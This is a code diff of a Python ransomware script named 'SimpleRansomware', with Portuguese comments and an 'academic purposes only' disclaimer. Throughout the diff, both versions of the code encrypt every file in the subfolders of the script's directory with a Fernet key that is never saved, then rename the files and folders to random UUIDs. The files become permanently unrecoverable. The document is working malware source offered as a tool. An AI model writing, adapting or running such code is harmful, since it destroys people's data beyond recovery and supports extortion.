@@ -2,6 +2,7 @@ from cryptography.fernet import Fernet
 from pathlib import Path
 import sys
 import uuid
+import os
 import art
 
 
@@ -9,92 +10,86 @@ class SimpleRansomware:
     """
         - Modelo basico de ransomware destinado apenas para fins academicos
         - Tome cuidado ao executa-lo pois mesmo não salva a chave sendo impossivel recuperar os arquivos
-        - Pastas e arquivos seram renomeados e criptografados
+        - Pastas e arquivos seram renomeados junto com suas extenções
     """
-    root_folder: Path = Path()
-
-    key = Fernet.generate_key()  # chave de criptografia
-    fernet = Fernet(key)
+    folder = ''
+    path = None
+    key = Fernet.generate_key()
 
     def welcome(self):
         """ Menu inicial """
         art.tprint(f'{" " * 16} Simple {" " * 16}', "tarty6")
         art.tprint('Ransomware', 'tarty6')
-        print(f"{'_' * 13} Ferramenta destinada apenas para fims academicos! {'_' * 13}\n")
 
+        print(f"{'_' * 13} Ferramenta destinada apenas para fims academicos! {'_' * 13}\n")
         self.danger_menu()
 
     def danger_menu(self):
         print(
             "Cuidado:\n"
-            "Essa ferramneta NÂO salva a chave para recuperar os arquivos, o uso indevido é de sua responsabilidade! \n"
-            "Esse Script vai tornar inlegivel tudo que estiver em subpastas na pasta do script. \n"
+            "Essa ferramneta não salva a chave para recuperar os arquivos, "
+            "os danos causados por ela são sua responsabilidade"
         )
-        option: str = input("Deseja executar essa ferramenta no seu sistema?(y/n)\n").lower()
+        option: str = input("Esse Script vai tornar inlegivel tudo que estiver em pastas na pasta do script."
+                            "Deseja executar essa ferramenta no seu sistema?(y/n)\n").lower()
 
-        self.check_danger_menu_option(option)
-
-    def check_danger_menu_option(self, option: str):
         if option == 'y':
-            self.start_attack()
+            self.start()
         else:
-            print("Saindo...")
             sys.exit()
 
-    def start_attack(self):
+    def start(self):
         """ Inicia o ataque """
-        folders = self.check_subfolders_in_root()
+        folders = self.check_folders()
 
         for folder in folders:
-            self.check_files_in_folder(folder)
+            self.folder = folder
+            self.check_files_in_forlder(folder)
 
-        self.exit_function()
+    def check_folders(self) -> list:
+        """ Verifica as subpastas na pasta raiz indicada """
+        folders = []
+        self.path = Path()
 
-    def check_subfolders_in_root(self) -> list:
-        """ Verifica as subpastas na pasta raiz do script e retorna uma lista com as mesmas """
-        folders: list = []
-
-        for item in self.root_folder.iterdir():
+        for item in self.path.iterdir():
             if item.is_dir():
                 folders.append(item)
-
+        
         return folders
 
-    def check_files_in_folder(self, folder: Path):
+    def check_files_in_forlder(self, folder):
         """ Executa o ataque nos arquivos da pasta selecionada """
-        files: list = [file for file in folder.glob('*') if file.is_file()]
+        files = os.listdir(folder)
 
-        for file in files:
-            self.attack_file_function(file)
+        for item in files:
+            self.encrypt_file(item)
+            self.rename_file(item)
 
-        self.rename_item_to_random_name(folder)
+        self.rename_folder()
 
-    def attack_file_function(self, file_path: Path):
-        self.encrypt_file(file_path)
-        self.rename_item_to_random_name(file_path)
-
-    def encrypt_file(self, file_path: Path):
-        """ Criptografa o arquivo selecionado """
-        with open(file_path, "wb+") as file:
+    def encrypt_file(self, filename):
+        """ Criptografa o arquivo """
+        with open(f"{self.folder}/{filename}", "rb") as file:
             file_data = file.read()
-            encrypted_data = self.fernet.encrypt(file_data)
+
+        f = Fernet(self.key)
+        encrypted_data = f.encrypt(file_data)
+
+        with open(f"{self.folder}/{filename}", "wb") as file:
             file.write(encrypted_data)
 
-    def rename_item_to_random_name(self, item_path: Path):
-        """ Renomea o item com um nome randomico """
-        new_name = self.get_random_name()
-        item_path.replace(new_name)
+    def rename_file(self, item):
+        """ Muda o nome do arquivo e a extensão para um valor aleatorio """
+        filename = Path(f'{self.folder}/{item}')
+        new_name = f"{uuid.uuid4()}{uuid.uuid4()}"
+        suffix = str(new_name)[32:16].replace('-', 'x')
 
-    @staticmethod
-    def get_random_name() -> str:
-        """ Gera um novo randomico """
-        random_name: str = f"{uuid.uuid4()}{uuid.uuid4()}"
-        return random_name
+        filename.replace(f'{self.folder}/{new_name}.{suffix}')
 
-    @staticmethod
-    def exit_function():
-        print("Terminado!!")
-        input("Aperte qualquer tecla para continuar...")
+    def rename_folder(self):
+        """ Muda o nome da pasta para algo inlegivel """
+        new_name = uuid.uuid4()
+        self.folder.rename(f"{self.path}/{new_name}")
 
     @staticmethod
     def alert():
